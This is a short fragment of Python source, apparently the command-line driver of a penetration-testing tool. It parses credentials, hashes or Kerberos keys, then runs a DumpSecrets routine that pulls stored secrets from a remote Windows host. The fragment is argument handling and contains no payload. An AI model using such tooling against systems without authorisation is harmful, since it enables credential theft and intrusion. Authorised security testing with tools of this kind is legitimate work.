        password = password + '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]
    if options.target_ip is None:
        options.target_ip = remoteName
    if domain is None:
        domain = ''
    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")
    if options.aesKey is not None:
        options.k = True
    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
